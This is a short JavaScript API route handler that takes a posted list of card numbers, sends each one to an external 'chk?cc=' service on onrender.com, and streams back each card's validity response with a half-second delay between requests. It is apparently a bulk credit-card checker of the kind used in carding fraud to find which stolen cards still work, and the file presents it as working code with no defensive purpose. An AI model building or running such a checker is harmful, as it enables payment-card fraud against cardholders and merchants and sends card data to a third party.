export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const { cards } = req.body;
  res.setHeader("Content-Type", "text/plain;charset=utf-8");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Transfer-Encoding", "chunked");

  for (const card of cards) {
    try {
      const apiRes = await fetch(`https://drlabapis.onrender.com/api/chk?cc=${encodeURIComponent(card)}`);
      const data = await apiRes.json();
      const line = `${card} ➜ ${data.response || "Unknown"}\n`;
      res.write(line);
    } catch (e) {
      res.write(`${card} ➜ Error\n`);
    }
    await new Promise(r => setTimeout(r, 500));
  }

  res.end();
}